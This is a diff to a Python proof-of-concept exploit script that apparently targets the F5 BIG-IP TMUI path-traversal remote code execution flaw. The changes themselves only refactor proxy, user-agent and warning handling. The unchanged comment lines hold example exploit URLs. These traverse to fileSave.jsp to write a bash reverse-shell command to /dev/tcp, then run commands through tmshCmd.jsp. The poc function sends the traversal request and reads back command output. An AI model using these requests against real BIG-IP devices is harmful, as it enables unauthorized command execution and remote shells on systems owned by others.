@@ -3,7 +3,10 @@
 
 import requests
 import json
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 
 # 脚本信息
 ######################################################
@@ -31,12 +34,11 @@ def poc(target):
     # https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/1.txt&content=bash+-i+>%26/dev/tcp/127.0.0.1/4444+0>%261
     # https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/1.txt
     headers = {
-        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+        "User-Agent":ua,
         "Accept-Language":"zh-CN,zh;q=0.9"
     }
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
 
         if "output" in r.text and r.status_code==200:
             c = json.loads(r.text)["output"]
@@ -46,7 +48,7 @@ def poc(target):
             return result
         else:
             pass
-    except Exception as e:
+    except:
         pass
 
 
